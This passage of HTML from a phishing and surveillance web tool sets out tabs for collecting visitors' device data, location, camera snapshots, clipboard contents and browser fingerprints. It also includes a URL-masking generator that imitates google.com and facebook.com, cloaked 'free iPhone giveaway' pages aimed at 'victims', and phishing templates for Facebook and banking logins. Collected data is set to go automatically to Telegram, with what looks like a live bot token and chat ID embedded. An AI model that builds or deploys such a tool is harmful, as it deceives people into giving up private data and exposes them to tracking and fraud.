                                            <div class="data-item">
                                                <span class="data-label">Screen Size:</span>
                                                <span class="data-value" id="screen-size">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Orientation:</span>
                                                <span class="data-value" id="orientation">Loading...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Extended Reality (XR):</span>
                                                <span class="data-value" id="xr-info">Checking...</span>
                                            </div>
                                            <div class="data-item">
                                                <span class="data-label">Bluetooth:</span>
                                                <span class="data-value" id="bluetooth-info">Checking...</span>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Network Info Tab -->
                                    <div class="tab-pane fade" id="network-tab">
                                        <h4 class="mb-4"><i class="fas fa-network-wired text-primary"></i> Network Information</h4>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">IPv4 Address:</span>
                                                    <span class="data-value" id="ipv4-address">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">IPv6 Address:</span>
                                                    <span class="data-value" id="ipv6-address">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Connection Type:</span>
                                                    <span class="data-value" id="connection-type">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Data Saver:</span>
                                                    <span class="data-value" id="data-saver">Loading...</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Online Status:</span>
                                                    <span class="data-value" id="online-status">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Network Bandwidth:</span>
                                                    <span class="data-value" id="network-bandwidth">Checking...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Effective Connection:</span>
                                                    <span class="data-value" id="effective-connection">Checking...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">RTT (Round Trip Time):</span>
                                                    <span class="data-value" id="network-rtt">Checking...</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Camera Tab -->
                                    <div class="tab-pane fade" id="camera-tab">
                                        <h4 class="mb-4"><i class="fas fa-camera text-primary"></i> Camera Snapshots</h4>
                                        <div class="row mb-4">
                                            <div class="col-md-6">
                                                <div class="camera-container">
                                                    <video id="front-camera" class="camera-feed" autoplay playsinline></video>
                                                </div>
                                                <div class="text-center">
                                                    <button class="snapshot-btn" onclick="takeSnapshot('front')">
                                                        <i class="fas fa-camera"></i> Take Front Camera Snapshot
                                                    </button>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="camera-container">
                                                    <video id="back-camera" class="camera-feed" autoplay playsinline></video>
                                                </div>
                                                <div class="text-center">
                                                    <button class="snapshot-btn" onclick="takeSnapshot('back')">
                                                        <i class="fas fa-camera"></i> Take Back Camera Snapshot
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <h5>Front Camera Snapshot</h5>
                                                <canvas id="front-snapshot" class="snapshot-canvas" width="640" height="480"></canvas>
                                                <img id="front-snapshot-img" class="img-fluid rounded" alt="Front Camera Snapshot" style="display:none;">
                                            </div>
                                            <div class="col-md-6">
                                                <h5>Back Camera Snapshot</h5>
                                                <canvas id="back-snapshot" class="snapshot-canvas" width="640" height="480"></canvas>
                                                <img id="back-snapshot-img" class="img-fluid rounded" alt="Back Camera Snapshot" style="display:none;">
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Battery Tab -->
                                    <div class="tab-pane fade" id="battery-tab">
                                        <h4 class="mb-4"><i class="fas fa-battery-full text-primary"></i> Battery Information</h4>
                                        <div class="text-center mb-4">
                                            <div class="progress">
                                                <div id="battery-level-bar" class="progress-bar" role="progressbar" style="width: 50%;" 
                                                     aria-valuenow="50" aria-valuemin="0" aria-valuemax="100">
                                                    <span id="battery-level-text">50%</span>
                                                </div>
                                            </div>
                                            <p id="battery-status-text" class="mt-2">Battery Status: Loading...</p>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Charging Status:</span>
                                                    <span class="data-value" id="charging-status">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Charging Time:</span>
                                                    <span class="data-value" id="charging-time">Loading...</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Discharging Time:</span>
                                                    <span class="data-value" id="discharging-time">Loading...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Battery Health:</span>
                                                    <span class="data-value" id="battery-health">Estimating...</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Location Tab -->
                                    <div class="tab-pane fade" id="location-tab">
                                        <h4 class="mb-4"><i class="fas fa-map-marker-alt text-primary"></i> Location Information</h4>
                                        <div class="location-map mb-4" id="location-map">
                                            <div class="d-flex align-items-center justify-content-center h-100">
                                                <div class="text-center">
                                                    <i class="fas fa-globe-americas fa-3x text-secondary mb-3"></i>
                                                    <p>Map will appear here when location is accessed</p>
                                                    <button class="btn btn-primary" onclick="getLocation()">
                                                        <i class="fas fa-location-crosshairs"></i> Get Location
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Latitude:</span>
                                                    <span class="data-value" id="latitude">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Longitude:</span>
                                                    <span class="data-value" id="longitude">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Accuracy:</span>
                                                    <span class="data-value" id="location-accuracy">Not retrieved yet</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Altitude:</span>
                                                    <span class="data-value" id="altitude">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Speed:</span>
                                                    <span class="data-value" id="speed">Not retrieved yet</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Timestamp:</span>
                                                    <span class="data-value" id="location-timestamp">Not retrieved yet</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Storage Tab -->
                                    <div class="tab-pane fade" id="storage-tab">
                                        <h4 class="mb-4"><i class="fas fa-hdd text-primary"></i> Storage Information</h4>
                                        <div class="row mb-4">
                                            <div class="col-md-6">
                                                <h5>Local Storage</h5>
                                                <div class="progress mb-2">
                                                    <div id="local-storage-bar" class="progress-bar" role="progressbar" style="width: 30%;" 
                                                         aria-valuenow="30" aria-valuemin="0" aria-valuemax="100">
                                                        <span id="local-storage-text">30%</span>
                                                    </div>
                                                </div>
                                                <p id="local-storage-details">Calculating...</p>
                                            </div>
                                            <div class="col-md-6">
                                                <h5>Session Storage</h5>
                                                <div class="progress mb-2">
                                                    <div id="session-storage-bar" class="progress-bar" role="progressbar" style="width: 10%;" 
                                                         aria-valuenow="10" aria-valuemin="0" aria-valuemax="100">
                                                        <span id="session-storage-text">10%</span>
                                                    </div>
                                                </div>
                                                <p id="session-storage-details">Calculating...</p>
                                            </div>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Storage Quota:</span>
                                            <span class="data-value" id="storage-quota">Checking...</span>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Storage Usage:</span>
                                            <span class="data-value" id="storage-usage">Checking...</span>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Storage Available:</span>
                                            <span class="data-value" id="storage-available">Checking...</span>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Storage Persistence:</span>
                                            <span class="data-value" id="storage-persistence">Checking...</span>
                                        </div>
                                    </div>
                                    
                                    <!-- Permissions Tab -->
                                    <div class="tab-pane fade" id="permissions-tab">
                                        <h4 class="mb-4"><i class="fas fa-shield-alt text-primary"></i> Permission Details</h4>
                                        <div id="permissions-container" class="row">
                                            <!-- Permissions will be loaded here -->
                                        </div>
                                    </div>
                                    
                                    <!-- Fingerprint Tab -->
                                    <div class="tab-pane fade" id="fingerprint-tab">
                                        <h4 class="mb-4"><i class="fas fa-fingerprint text-primary"></i> Device & Browser Fingerprint</h4>
                                        <div class="fingerprint-canvas mb-4" id="fingerprint-canvas">
                                            <div class="d-flex align-items-center justify-content-center h-100">
                                                <div class="text-center">
                                                    <i class="fas fa-fingerprint fa-3x text-secondary"></i>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Canvas Fingerprint:</span>
                                                    <span class="data-value" id="canvas-fingerprint">Generating...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">WebGL Fingerprint:</span>
                                                    <span class="data-value" id="webgl-fingerprint">Generating...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Audio Fingerprint:</span>
                                                    <span class="data-value" id="audio-fingerprint">Generating...</span>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="data-item">
                                                    <span class="data-label">Fonts Fingerprint:</span>
                                                    <span class="data-value" id="fonts-fingerprint">Generating...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Screen Fingerprint:</span>
                                                    <span class="data-value" id="screen-fingerprint">Generating...</span>
                                                </div>
                                                <div class="data-item">
                                                    <span class="data-label">Time Zone:</span>
                                                    <span class="data-value" id="timezone-fingerprint">Loading...</span>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="data-item">
                                            <span class="data-label">Full Fingerprint Hash:</span>
                                            <span class="data-value" id="full-fingerprint">Generating...</span>
                                        </div>
                                    </div>
                                    
                                    <!-- Clipboard Tab -->
                                    <div class="tab-pane fade" id="clipboard-tab">
                                        <h4 class="mb-4"><i class="fas fa-clipboard text-primary"></i> Clipboard Data</h4>
                                        <div class="alert alert-info">
                                            <i class="fas fa-info-circle"></i> Click the button below to read clipboard content. This requires user permission.
                                        </div>
                                        <div class="text-center mb-4">
                                            <button class="btn btn-primary btn-lg" onclick="readClipboard()">
                                                <i class="fas fa-clipboard-check"></i> Read Clipboard Content
                                            </button>
                                        </div>
                                        <div class="mb-3">
                                            <label for="clipboard-content" class="form-label">Clipboard Content:</label>
                                            <textarea class="form-control" id="clipboard-content" rows="5" placeholder="Clipboard content will appear here..."></textarea>
                                        </div>
                                        <div class="text-end">
                                            <button class="btn btn-success" onclick="copyToClipboard('clipboard-content')">
                                                <i class="fas fa-copy"></i> Copy to Clipboard
                                            </button>
                                        </div>
                                    </div>
                                    
                                    <!-- Mask URLs Tab -->
                                    <div class="tab-pane fade" id="mask-tab">
                                        <h4 class="mb-4"><i class="fas fa-mask text-primary"></i> Mask URL Generator</h4>
                                        <div class="alert alert-warning">
                                            <i class="fas fa-exclamation-triangle"></i> This tool generates masked URLs that can obscure the original destination.
                                        </div>
                                        <div class="mb-3">
                                            <label for="original-url" class="form-label">Original URL:</label>
                                            <input type="url" class="form-control" id="original-url" placeholder="https://example.com" value="https://example.com">
                                        </div>
                                        <div class="mb-3">
                                            <label for="mask-domain" class="form-label">Mask Domain:</label>
                                            <select class="form-control" id="mask-domain">
                                                <option value="https://google.com">google.com</option>
                                                <option value="https://youtube.com">youtube.com</option>
                                                <option value="https://facebook.com">facebook.com</option>
                                                <option value="https://instagram.com">instagram.com</option>
                                                <option value="https://twitter.com">twitter.com</option>
                                                <option value="custom">Custom Domain</option>
                                            </select>
                                        </div>
                                        <div class="mb-3 d-none" id="custom-domain-container">
                                            <label for="custom-domain" class="form-label">Custom Domain:</label>
                                            <input type="text" class="form-control" id="custom-domain" placeholder="https://yourdomain.com">
                                        </div>
                                        <div class="text-center mb-4">
                                            <button class="btn btn-primary" onclick="generateMaskedURL()">
                                                <i class="fas fa-magic"></i> Generate Masked URL
                                            </button>
                                        </div>
                                        <div class="mask-url" id="masked-url-container">
                                            Masked URL will appear here
                                        </div>
                                        <div class="text-end mt-3">
                                            <button class="btn btn-success" onclick="copyMaskedURL()">
                                                <i class="fas fa-copy"></i> Copy Masked URL
                                            </button>
                                        </div>
                                    </div>
                                    
                                    <!-- Link Generator Tab -->
                                    <div class="tab-pane fade" id="link-tab">
                                        <h4 class="mb-4"><i class="fas fa-share-alt text-primary"></i> Link Generator & Campaign Manager</h4>
                                        
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="telegram-config">
                                                    <h5><i class="fas fa-link"></i> Generate Tracking Link</h5>
                                                    
                                                    <div class="mb-3">
                                                        <label for="campaign-name" class="form-label">Campaign Name:</label>
                                                        <input type="text" class="form-control" id="campaign-name" 
                                                               placeholder="e.g., Facebook Campaign, Email Marketing" 
                                                               value="Test Campaign">
                                                    </div>
                                                    
                                                    <div class="mb-3">
                                                        <label for="redirect-url" class="form-label">Redirect URL (After Scan):</label>
                                                        <input type="url" class="form-control" id="redirect-url" 
                                                               placeholder="https://example.com" 
                                                               value="https://google.com">
                                                        <div class="form-text">Where users will be redirected after data collection</div>
                                                    </div>
                                                    
                                                    <div class="mb-3">
                                                        <label for="cloak-url" class="form-label">Cloaking URL (Visible to User):</label>
                                                        <input type="url" class="form-control" id="cloak-url" 
                                                               placeholder="https://trusted-site.com" 
                                                               value="https://free-gifts.com">
                                                        <div class="form-text">What users will see in their address bar</div>
                                                    </div>
                                                    
                                                    <div class="mb-3">
                                                        <label for="cloak-title" class="form-label">Page Title:</label>
                                                        <input type="text" class="form-control" id="cloak-title" 
                                                               placeholder="Free iPhone Giveaway!" 
                                                               value="üéÅ Free iPhone 15 Pro Max Giveaway!">
                                                    </div>
                                                    
                                                    <div class="mb-3">
                                                        <label class="form-label">Data to Collect:</label>
                                                        <div class="row">
                                                            <div class="col-6">
                                                                <div class="form-check">
                                                                    <input class="form-check-input" type="checkbox" id="collect-basic" checked>
                                                                    <label class="form-check-label" for="collect-basic">
                                                                        Basic Info
                                                                    </label>
                                                                </div>
                                                                <div class="form-check">
                                                                    <input class="form-check-input" type="checkbox" id="collect-location" checked>
                                                                    <label class="form-check-label" for="collect-location">
                                                                        Location
                                                                    </label>
                                                                </div>
                                                                <div class="form-check">
                                                                    <input class="form-check-input" type="checkbox" id="collect-camera">
                                                                    <label class="form-check-label" for="collect-camera">
                                                                        Camera
                                                                    </label>
                                                                </div>
                                                            </div>
                                                            <div class="col-6">
                                                                <div class="form-check">
                                                                    <input class="form-check-input" type="checkbox" id="collect-network" checked>
                                                                    <label class="form-check-label" for="collect-network">
                                                                        Network
                                                                    </label>
                                                                </div>
                                                                <div class="form-check">
                                                                    <input class="form-check-input" type="checkbox" id="collect-battery" checked>
                                                                    <label class="form-check-label" for="collect-battery">
                                                                        Battery
                                                                    </label>
                                                                </div>
                                                                <div class="form-check">
                                                                    <input class="form-check-input" type="checkbox" id="collect-clipboard">
                                                                    <label class="form-check-label" for="collect-clipboard">
                                                                        Clipboard
                                                                    </label>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    
                                                    <div class="mb-3">
                                                        <label class="form-label">Auto-send to Telegram:</label>
                                                        <div class="form-check">
                                                            <input class="form-check-input" type="checkbox" id="auto-telegram" checked>
                                                            <label class="form-check-label" for="auto-telegram">
                                                                Automatically send data to Telegram
                                                            </label>
                                                        </div>
                                                    </div>
                                                    
                                                    <div class="text-center">
                                                        <button class="btn link-btn btn-lg" onclick="generateTrackingLink()">
                                                            <i class="fas fa-magic"></i> Generate Tracking Link
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                            
                                            <div class="col-md-6">
                                                <div class="telegram-config">
                                                    <h5><i class="fas fa-chart-line"></i> Campaign Preview</h5>
                                                    
                                                    <div class="cloak-preview" id="cloak-preview">
                                                        <h5 id="preview-title">üéÅ Free iPhone 15 Pro Max Giveaway!</h5>
                                                        <p>This is how your cloaked page will appear to victims.</p>
                                                        <img src="https://via.placeholder.com/400x200/4A90E2/FFFFFF?text=Trusted+Website+Preview" 
                                                             alt="Cloaked Page Preview" class="mb-3">
                                                        <p class="small text-muted">Users will see this page while data is collected in the background.</p>
                                                    </div>
                                                    
                                                    <div class="link-preview" id="generated-link-preview">
                                                        <div class="small text-warning">Link will appear here after generation</div>
                                                    </div>
                                                    
                                                    <div class="mb-3">
                                                        <label class="form-label">Shorten Link:</label>
                                                        <div class="input-group">
                                                            <select class="form-control" id="shortener-service">
                                                                <option value="bitly">Bitly</option>
                                                                <option value="tinyurl">TinyURL</option>
                                                                <option value="isgd">is.gd</option>
                                                                <option value="custom">Custom Domain</option>
                                                            </select>
                                                            <button class="btn btn-primary" onclick="shortenLink()">
                                                                <i class="fas fa-compress"></i> Shorten
                                                            </button>
                                                        </div>
                                                    </div>
                                                    
                                                    <div class="shortener-result" id="shortened-link" style="display: none;">
                                                        <div class="d-flex justify-content-between align-items-center">
                                                            <div>
                                                                <strong>Shortened Link:</strong>
                                                                <div id="short-link-text" class="small"></div>
                                                            </div>
                                                            <button class="btn btn-sm btn-light" onclick="copyShortLink()">
                                                                <i class="fas fa-copy"></i>
                                                            </button>
                                                        </div>
                                                    </div>
                                                    
                                                    <h6 class="mt-3">Share Via:</h6>
                                                    <div class="d-flex justify-content-center">
                                                        <button class="social-share-btn facebook" onclick="shareLink('facebook')">
                                                            <i class="fab fa-facebook-f"></i>
                                                        </button>
                                                        <button class="social-share-btn whatsapp" onclick="shareLink('whatsapp')">
                                                            <i class="fab fa-whatsapp"></i>
                                                        </button>
                                                        <button class="social-share-btn telegram" onclick="shareLink('telegram')">
                                                            <i class="fab fa-telegram"></i>
                                                        </button>
                                                        <button class="social-share-btn twitter" onclick="shareLink('twitter')">
                                                            <i class="fab fa-twitter"></i>
                                                        </button>
                                                        <button class="social-share-btn messenger" onclick="shareLink('messenger')">
                                                            <i class="fab fa-facebook-messenger"></i>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <div class="mt-4">
                                            <h5><i class="fas fa-history"></i> Active Campaigns</h5>
                                            <div id="campaigns-list">
                                                <div class="campaign-item">
                                                    <div class="d-flex justify-content-between">
                                                        <strong>Sample Campaign</strong>
                                                        <span class="badge bg-success">Active</span>
                                                    </div>
                                                    <p class="small mb-1">https://free-gifts.com/iphone-giveaway</p>
                                                    <div class="campaign-stats">
                                                        <span><i class="fas fa-eye"></i> 1,234 Views</span> ‚Ä¢ 
                                                        <span><i class="fas fa-user"></i> 567 Clicks</span> ‚Ä¢ 
                                                        <span><i class="fas fa-download"></i> 234 Data Collected</span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <!-- Telegram Bot Tab -->
                                    <div class="tab-pane fade" id="telegram-tab">
                                        <h4 class="mb-4"><i class="fab fa-telegram text-primary"></i> Telegram Bot Integration</h4>
                                        
                                        <div class="telegram-config">
                                            <h5><i class="fas fa-cog"></i> Configuration</h5>
                                            <div class="mb-3">
                                                <label for="bot-token" class="form-label">Bot Token:</label>
                                                <input type="text" class="form-control" id="bot-token" 
                                                       placeholder="Enter your Telegram bot token" 
                                                       value="7019340909:AAH2sTNgqfGQKb-XOYtXg34yEjmSrSajQ0M">
                                                <div class="form-text">
                                                    Get your bot token from <a href="https://t.me/BotFather" target="_blank">@BotFather</a>
                                                </div>
                                            </div>
                                            
                                            <div class="mb-3">
                                                <label for="chat-id" class="form-label">Chat ID:</label>
                                                <input type="text" class="form-control" id="chat-id" 
                                                       placeholder="Enter your Telegram chat ID"
                                                       value="1922624413">
                                                <div class="form-text">
                                                    Get your chat ID by sending a message to <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a>
                                                </div>
                                            </div>
                                            
                                            <div class="mb-3">
                                                <label for="data-select" class="form-label">Data to Send:</label>
                                                <select class="form-control" id="data-select" multiple>
                                                    <option value="device" selected>Device Information</option>
                                                    <option value="network" selected>Network Information</option>
                                                    <option value="location" selected>Location Information</option>
                                                    <option value="battery" selected>Battery Information</option>
                                                    <option value="storage" selected>Storage Information</option>
                                                    <option value="fingerprint" selected>Fingerprint</option>
                                                    <option value="permissions" selected>Permissions</option>
                                                    <option value="screenshots">Camera Screenshots</option>
                                                    <option value="clipboard">Clipboard Data</option>
                                                    <option value="all">All Data</option>
                                                </select>
                                                <div class="form-text">Hold Ctrl/Cmd to select multiple options</div>
                                            </div>
                                            
                                            <div class="mb-3">
                                                <div class="form-check">
                                                    <input class="form-check-input" type="checkbox" id="include-screenshots" checked>
                                                    <label class="form-check-label" for="include-screenshots">
                                                        Include camera screenshots (if available)
                                                    </label>
                                                </div>
                                            </div>
                                            
                                            <div class="text-center">
                                                <button class="btn telegram-btn btn-lg" onclick="sendToTelegram()">
                                                    <i class="fab fa-telegram"></i> Send Data to Telegram
                                                </button>
                                                <button class="btn btn-outline-primary ms-2" onclick="testTelegramConnection()">
                                                    <i class="fas fa-wifi"></i> Test Connection
                                                </button>
                                            </div>
                                        </div>
                                        
                                        <div class="mt-4">
                                            <h5><i class="fas fa-history"></i> Send History</h5>
                                            <div id="telegram-history" class="small">
                                                <p class="text-muted">No data sent yet.</p>
                                            </div>
                                        </div>
                                        
                                        <div class="mt-4">
                                            <h5><i class="fas fa-lightbulb"></i> How to Setup</h5>
                                            <ol class="small">
                                                <li>Create a Telegram bot via <a href="https://t.me/BotFather" target="_blank">@BotFather</a></li>
                                                <li>Get your bot token from BotFather</li>
                                                <li>Start a chat with your bot</li>
                                                <li>Get your chat ID via <a href="https://t.me/userinfobot" target="_blank">@userinfobot</a></li>
                                                <li>Enter the token and chat ID above</li>
                                                <li>Click "Send Data to Telegram"</li>
                                            </ol>
                                        </div>
                                    </div>
                                    
                                    <!-- All-in-One Tools Tab -->
                                    <div class="tab-pane fade" id="all-tools-tab">
                                        <h4 class="mb-4"><i class="fas fa-boxes text-primary"></i> All-in-One Tools</h4>
                                        <div class="row text-center">
                                            <div class="col-md-4 mb-4">
                                                <div class="info-card p-4">
                                                    <div class="tool-icon">
                                                        <i class="fas fa-eye"></i>
                                                    </div>
                                                    <h5>IP Lookup</h5>
                                                    <p>Detailed IP address information with geolocation</p>
                                                    <button class="btn btn-sm btn-outline-primary" onclick="showIPTab()">Open</button>
                                                </div>
                                            </div>
                                            <div class="col-md-4 mb-4">
                                                <div class="info-card p-4">
                                                    <div class="tool-icon">
                                                        <i class="fas fa-code"></i>
                                                    </div>
                                                    <h5>User Agent Analyzer</h5>
                                                    <p>Parse and analyze browser user agent string</p>
                                                    <button class="btn btn-sm btn-outline-primary" onclick="showUserAgentTab()">Open</button>
                                                </div>
                                            </div>
                                            <div class="col-md-4 mb-4">
                                                <div class="info-card p-4">
                                                    <div class="tool-icon">
                                                        <i class="fas fa-desktop"></i>
                                                    </div>
                                                    <h5>Screen Tester</h5>
                                                    <p>Test screen resolution, color, and display properties</p>
                                                    <button class="btn btn-sm btn-outline-primary" onclick="testScreen()">Open</button>
                                                </div>
                                            </div>
                                            <div class="col-md-4 mb-4">
                                                <div class="info-card p-4">
                                                    <div class="tool-icon">
                                                        <i class="fas fa-network-wired"></i>
                                                    </div>
                                                    <h5>Network Tester</h5>
                                                    <p>Test network speed, latency, and connection quality</p>
                                                    <button class="btn btn-sm btn-outline-primary" onclick="testNetwork()">Open</button>
                                                </div>
                                            </div>
                                            <div class="col-md-4 mb-4">
                                                <div class="info-card p-4">
                                                    <div class="tool-icon">
                                                        <i class="fas fa-shield-alt"></i>
                                                    </div>
                                                    <h5>Security Check</h5>
                                                    <p>Check browser security settings and vulnerabilities</p>
                                                    <button class="btn btn-sm btn-outline-primary" onclick="checkSecurity()">Open</button>
                                                </div>
                                            </div>
                                            <div class="col-md-4 mb-4">
                                                <div class="info-card p-4">
                                                    <div class="tool-icon">
                                                        <i class="fas fa-compress-arrows-alt"></i>
                                                    </div>
                                                    <h5>Data Compressor</h5>
                                                    <p>Compress and decompress data for efficiency</p>
                                                    <button class="btn btn-sm btn-outline-primary" onclick="compressData()">Open</button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="row mt-4">
                        <div class="col-12">
                            <div class="glass-card p-3 text-center">
                                <p class="mb-0 text-white">
                                    <i class="fas fa-exclamation-circle"></i> 
                                    <small>This tool collects device information that is typically available to websites through standard browser APIs. Use responsibly and ethically.</small>
                                </p>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Link Generation Modal -->
                <div class="modal fade" id="linkModal" tabindex="-1" aria-labelledby="linkModalLabel" aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="linkModalLabel">
                                    <i class="fas fa-link"></i> Quick Link Generator
                                </h5>
                                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6>Quick Templates</h6>
                                        <div class="d-grid gap-2">
                                            <button class="btn btn-primary" onclick="generatePhishingTemplate('facebook')">
                                                <i class="fab fa-facebook"></i> Facebook Login
                                            </button>
                                            <button class="btn btn-success" onclick="generatePhishingTemplate('instagram')">
                                                <i class="fab fa-instagram"></i> Instagram Giveaway
                                            </button>
                                            <button class="btn btn-warning" onclick="generatePhishingTemplate('netflix')">
                                                <i class="fab fa-netflix"></i> Netflix Free Trial
                                            </button>
                                            <button class="btn btn-danger" onclick="generatePhishingTemplate('banking')">
                                                <i class="fas fa-university"></i> Banking Security Check
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h6>Custom Link</h6>
                                        <div class="mb-3">
                                            <label class="form-label">Link Type:</label>
                                            <select class="form-control" id="quick-link-type">
                                                <option value="direct">Direct Scanner</option>
                                                <option value="cloaked">Cloaked Page</option>
                                                <option value="redirect">Redirect After Scan</option>
                                            </select>
                                        </div>
                                        <button class="btn link-btn w-100" onclick="generateQuickLink()">
                                            <i class="fas fa-bolt"></i> Generate Quick Link
                                        </button>
                                        
                                        <div class="mt-3">
                                            <h6>QR Code</h6>
                                            <div class="qr-code mx-auto">
                                                <span>QR Code will appear after link generation</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="link-preview mt-4" id="quick-link-preview">
                                    <div class="text-center text-muted">Quick link will appear here</div>
                                </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                                <button type="button" class="btn btn-primary" onclick="copyQuickLink()">
                                    <i class="fas fa-copy"></i> Copy Link
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Telegram Modal -->
                <div class="modal fade" id="telegramModal" tabindex="-1" aria-labelledby="telegramModalLabel" aria-hidden="true">
                    <div class="modal-dialog modal-lg">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="telegramModalLabel">
                                    <i class="fab fa-telegram"></i> Send Data to Telegram
                                </h5>
                                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="row">
                                    <div class="col-md-6">
                                        <h6>Quick Send</h6>
                                        <div class="d-grid gap-2">
                                            <button class="btn btn-primary" onclick="sendBasicInfo()">
                                                <i class="fas fa-info-circle"></i> Send Basic Info
                                            </button>
                                            <button class="btn btn-success" onclick="sendLocationInfo()">
                                                <i class="fas fa-map-marker-alt"></i> Send Location
                                            </button>
                                            <button class="btn btn-warning" onclick="sendScreenshots()">
                                                <i class="fas fa-camera"></i> Send Screenshots
                                            </button>
                                            <button class="btn btn-danger" onclick="sendEverything()">
                                                <i class="fas fa-paper-plane"></i> Send Everything
                                            </button>
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <h6>Advanced Options</h6>
                                        <div class="mb-3">
                                            <label for="custom-message" class="form-label">Custom Message:</label>
                                            <textarea class="form-control" id="custom-message" rows="3" placeholder="Add a custom message..."></textarea>
                                        </div>
                                        <div class="mb-3">
                                            <div class="form-check">
                                                <input class="form-check-input" type="checkbox" id="send-anonymously" checked>
                                                <label class="form-check-label" for="send-anonymously">
                                                    Remove personal info
                                                </label>
                                            </div>
                                        </div>
                                        <button class="btn telegram-btn w-100" onclick="sendCustomData()">
                                            <i class="fab fa-telegram"></i> Send with Custom Options
                                        </button>
                                    </div>
                                </div>
                                
                                <div class="screenshot-container mt-4">
                                    <h6>Available Screenshots</h6>
                                    <div id="screenshots-preview" class="row">
                                        <!-- Screenshots will appear here -->
                                    </div>
                                </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Settings Modal -->
                <div class="modal fade" id="settingsModal" tabindex="-1" aria-labelledby="settingsModalLabel" aria-hidden="true">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h5 class="modal-title" id="settingsModalLabel">
                                    <i class="fas fa-cog"></i> Settings
                                </h5>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="mb-3">
                                    <label class="form-label">Auto-send to Telegram:</label>
                                    <div class="form-check">
                                        <input class="form-check-input" type="checkbox" id="auto-send">
                                        <label class="form-check-label" for="auto-send">
                                            Automatically send data when collected
                                        </label>
                                    </div>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Data Retention:</label>
                                    <select class="form-control" id="data-retention">
                                        <option value="session">Keep until browser closes</option>
                                        <option value="24h">Keep for 24 hours</option>
                                        <option value="7days">Keep for 7 days</option>
                                        <option value="forever">Keep forever</option>
                                    </select>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Telegram Bot Defaults:</label>
                                    <div class="form-check">
